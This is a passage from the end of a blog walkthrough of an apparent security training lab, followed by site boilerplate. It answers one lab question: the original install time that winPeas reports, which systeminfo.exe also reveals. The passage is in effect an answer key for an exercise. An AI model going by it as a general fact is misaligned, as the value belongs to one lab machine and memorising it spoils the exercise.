<p>Using winPeas, what was the Original Install time? (This is date and time)
<code>8/3/2019, 10:43:23 AM</code></p>
</blockquote>
<p>a <code>systeminfo.exe</code> commnd gives it away.</p>
<hr>
<!-- Amazon Ads-->
<script type="text/javascript" language="javascript">
      var aax_size='300x250';
      var aax_pubname = 'anir0y-21';
      var aax_src='302';
    </script>
<script type="text/javascript" language="javascript" src="https://c.amazon-adsystem.com/aax2/assoc.js"></script>
<!-- Amazon Ads-->
<script data-name="BMC-Widget" data-cfasync="false" src="https://cdnjs.buymeacoffee.com/1.0.0/widget.prod.min.js" data-id="anir0y" data-description="Support me on Buy me a coffee!" data-message="" data-color="#5F7FFF" data-position="Right" data-x_margin="18" data-y_margin="18"></script>
<hr>
</article>
    </section>

    

    

    
  </div>
</div>


            <footer class="ui basic center aligned segment" style="background-color: transparent;">
              
              <p>© 2010 - 2025 Classroom</p>
              

              

              
            </footer>
          </div>
        </section>
        <section class="back">
          <div class="dream-max-width">
            <header class="ui basic very padded segment dream-header">
  <div class="ui small circular image">
    
    <img src="/img/avatar.jpeg" />
    
  </div>

  <div class="content">
    <h1 class="ui medium header">Reading Stuffs<div class="sub header"></div>
    </h1>

    <article class="ui horizontal list">
      
      <a class="item" href="/categories">
        <i class="th list icon" title="All Categories"></i>
      </a>
      <a class="item" href="/tags">
        <i class="tags icon" title="All Tags"></i>
      </a>
    </article>

  </div>
</header>


<div class="ui relaxed grid dream-grid dream-back">
  
  
  

  <div class="sixteen wide mobile eight wide tablet four wide computer column dream-column">
    <article class="ui segment">
      <h3 class="ui header">Social Links</h3>
      <nav class="ui secondary menu dream-menu dream-socials">
  
  <div class="item">
    <a href="/index.xml">
      <i class="large rss square icon" title="RSS"></i>
    </a>
  </div>
  

  
  <div class="item">
    <a href="mailto:classroom@anir0y.in">
      <i class="large mail icon" title="Email"></i>
    </a>
  </div>
  

  
  <div class="item">
    <a href="https://twitter.com/anir0y" target="_blank">
      <i class="large twitter icon" title="Twitter"></i>
    </a>
  </div>
  

  
  <div class="item">
    <a href="https://facebook.com/0xanir0y" target="_blank">
      <i class="large facebook icon" title="Facebook"></i>
    </a>
  </div>
  

  
  <div class="item">
    <a href="https://instagram.com/0xanir0y" target="_blank">
      <i class="large instagram icon" title="Instagram"></i>
    </a>
  </div>
  

  

  
  <div class="item">
    <a href="https://www.linkedin.com/in/anir0y" target="_blank">
      <i class="large linkedin icon" title="Linkedin"></i>
    </a>
  </div>
  

  
  <div class="item">
    <a href="https://github.com/anir0y" target="_blank">
      <i class="large github icon" title="GitHub"></i>
    </a>
  </div>
  

  

  
</nav>

    </article>
  </div>

  <div class="sixteen wide mobile eight wide tablet four wide computer column dream-column">
    
    <article class="ui segment">
      YOU CAN REUSE MY CONTENT
    </article>
    
  </div>

  
  
  
</div>

          </div>
        </section>
      </div>
    </div>

    <script>
  window.defaultDark =  null 
  window.backgroundDark = "black"
  window.backgroundImageDark =  null 
  window.darkNav =  true 
  window.hasTwitterEmbed =  true 

  if (window.hasTwitterEmbed) {
    
    window.twttr = (function (d, s, id) {
      var js,
        fjs = d.getElementsByTagName(s)[0],
        t = window.twttr || {}
      if (d.getElementById(id)) return t
      js = d.createElement(s)
      js.id = id
      js.src = 'https://platform.twitter.com/widgets.js'
      fjs.parentNode.insertBefore(js, fjs)

      t._e = []
      t.ready = function (f) {
        t._e.push(f)
      }

      return t
    })(document, 'script', 'twitter-wjs')
  }
</script>
<script src="/js/jquery.min.js"></script>
<script src="/js/semantic.min.js"></script>
<script src="/js/jquery.overlayScrollbars.min.js"></script>
<script src="/js/header.js"></script>
<script src="/js/main.js"></script>
<script src="/js/theme.js"></script>

    
<script src="/js/html2canvas.min.js"></script>
<script src="/js/post.js"></script>


<script src="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release/build/highlight.min.js"></script>



<script src="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release/build/languages/clojure.min.js"></script>

<script src="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release/build/languages/ocaml.min.js"></script>



<script>
  hljs.initHighlightingOnLoad()
  setHighlightTheme()

  function setHighlightTheme() {
    var isDark = localStore.getItem('hugo-theme-dream-is-dark')
    isDark = isDark ? isDark : window.defaultDark ? 'y' : isDark

    var lightTheme = "tomorrow"
    var darkTheme = "tomorrow-night"
    var theme = isDark === 'y' ? darkTheme : lightTheme

    $('link[data-highlight]').attr('href', 'https://cdn.jsdelivr.net/gh/highlightjs/cdn-release/build/styles/' + theme + '.min.css')
    $('pre').css('background', isDark === 'y' ? '#333' : '')
  }
</script>





    
    <div class="ui inverted segment" id="dream-search">
  <div class="ui search">
    <div class="ui transparent input">
      <input class="prompt" type="text" placeholder="Search" />
    </div>
    <div class="results"></div>
  </div>
</div>
<script>
  $(document).ready(function () {
    $.getJSON('http:\/\/localhost:1313\//index.json', function (data) {
      $('.ui.search').search({
        source: data,
        searchFields: ['title'],
        showNoResults: true,
      })
    })
  })
</script>
<script src="/js/search.js"></script>

    

    

    
  </body>
</html>
